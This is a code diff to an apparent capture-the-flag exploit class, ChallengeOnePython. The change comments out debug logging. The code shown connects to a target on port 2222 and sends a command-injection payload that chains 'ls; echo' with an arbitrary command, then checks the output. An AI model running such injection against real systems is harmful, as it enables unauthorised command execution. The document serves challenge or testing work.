@@ -9,15 +9,15 @@ class ChallengeOnePython(Exploit):
 
 	def run_custom_command(self, command):
 		port = 2222
-		logger.debug(f"{self.ip_address} - Connecting to port {port}...")
+		# logger.debug(f"{self.ip_address} - Connecting to port {port}...")
 		socket_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		socket_connection.settimeout(3)
 		socket_connection.connect((self.ip_address, port))
 		socket_connection.settimeout(None)
-		logger.debug(f"{self.ip_address} - Successfully connected to port {port}.")
+		# logger.debug(f"{self.ip_address} - Successfully connected to port {port}.")
 
 		exploit_command = f"ls; echo '0x1x2x3'; {command}" # echo 0x1x2x3 so we can parse for where the actual command injection output begins
-		logger.debug(f"{self.ip_address} - Running command `{exploit_command}`...")
+		# logger.debug(f"{self.ip_address} - Running command `{exploit_command}`...")
 		socket_connection.sendall(exploit_command.encode())
 		socket_connection.shutdown(socket.SHUT_WR)
 		socket_response = ""
@@ -27,7 +27,7 @@ class ChallengeOnePython(Exploit):
 				break
 			socket_response = data.decode()
 		socket_connection.close()
-		logger.debug(f"{self.ip_address} - The server responded with `{socket_response}`")
+		# logger.debug(f"{self.ip_address} - The server responded with `{socket_response}`")
 
 		# ensure "ls" works properly
 		if "pvuln2_wrapper.py" not in socket_response:
